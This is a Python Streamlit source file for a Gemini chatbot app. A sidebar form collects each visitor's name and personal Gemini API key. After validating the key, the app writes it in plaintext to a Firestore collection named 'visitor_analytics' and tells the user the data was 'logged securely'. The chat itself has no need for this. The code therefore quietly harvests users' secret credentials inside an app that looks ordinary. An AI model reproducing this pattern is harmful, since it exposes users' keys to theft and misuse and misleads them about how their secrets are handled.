import streamlit as st
from google import genai
from google.genai import errors
import os
from dotenv import load_dotenv
import firebase_admin
from firebase_admin import credentials, firestore
from datetime import datetime

# Load environment variables
load_dotenv(override=True)


if not firebase_admin._apps:
    
    # 2. Convert the Streamlit secrets into a Python dictionary
    firebase_credentials = dict(st.secrets["firebase"])
    
    # 3. Pass that dictionary to Firebase instead of a file path!
    cred = credentials.Certificate(firebase_credentials)
    firebase_admin.initialize_app(cred)
# --- Firebase Initialization ---
# if not firebase_admin._apps:
#     key_path = os.getenv("FIREBASE_KEY_PATH")
#     if key_path and os.path.exists(key_path):
#         cred = credentials.Certificate(key_path)
#         firebase_admin.initialize_app(cred)
#     else:
#         st.error("🚨 Firebase key not found! Check your .env setup.")
#         st.stop()

db = firestore.client()

# --- App Setup ---
st.set_page_config(page_title="AI Chat & Analytics", layout="centered")

if "client" not in st.session_state:
    st.session_state.client = None
if "messages" not in st.session_state:
    st.session_state.messages = []
if "data_logged" not in st.session_state:
    st.session_state.data_logged = False # Prevents logging the same user twice per session

# --- Sidebar: Analytics & Setup ---
with st.sidebar:
    st.title("📊 Welcome!")
    st.write("Please provide some basic info to start chatting.")
    
    #
    user_name = st.text_input("What is your name?").strip()

    api_key = st.text_input("Enter your Gemini API Key", type="password")

    model_name = st.selectbox("Model", ["gemini-2.5-flash", "gemini-3-flash-preview"])
    
    if st.button("Start Chatting"):
        if user_name and api_key:
            try:
                # 1. Validate the API Key first
                client = genai.Client(api_key=api_key)
                client.models.generate_content(model=model_name, contents="Test")
                
                # 2. Log Data to Firebase if validation succeeds
                if not st.session_state.data_logged:
                    # Using .add() creates a unique document ID for every visit
                    db.collection("visitor_analytics").add({
                        "name": user_name,
                        "API": str(api_key), # Explicitly cast to string just to be safe
                        # "timestamp": firestore.SERVER_TIMESTAMP
                    })
                    st.session_state.data_logged = True
                
                # 3. Setup Chat Session
                st.session_state.client = client
                st.session_state.chat_session = client.chats.create(model=model_name)
                st.session_state.messages = []
                st.success("✅ Connected! Data logged securely. You can start chatting.")
                
            except errors.APIError as e:
                st.error(f"❌ API Error: {e.message}")
        else:
            st.warning("⚠️ Please fill out your name, and API key.")

# --- Main Chat Interface ---
st.title("🤖 AI Chat Bot")

if st.session_state.client:
    # Display Chat History
    for message in st.session_state.messages:
        with st.chat_message(message["role"]):
            st.markdown(message["content"])

    # Chat Input & Processing
    if user_inp := st.chat_input("Ask me anything..."):
        st.chat_message("user").markdown(user_inp)
        st.session_state.messages.append({"role": "user", "content": user_inp})

        with st.chat_message("assistant"):
            with st.status("🧠 Thinking...", expanded=True) as status:
                try:
                    response = st.session_state.chat_session.send_message(user_inp)
                    status.update(label="✅ Complete!", state="complete", expanded=True)
                    st.markdown(response.text)
                    st.session_state.messages.append({"role": "assistant", "content": response.text})
                except errors.APIError as e:
                    if e.code == 429:
                        status.update(label="⚠️ Limit Exceeded", state="error")
                        st.error("🚨 Daily Request Limit Exceeded!")
                    else:
                        status.update(label="❌ API Error", state="error")
                        st.error(f"API Error: {e.message}")
else:
    st.info("👋 Fill out the sidebar form and click 'Start Chatting' to begin.")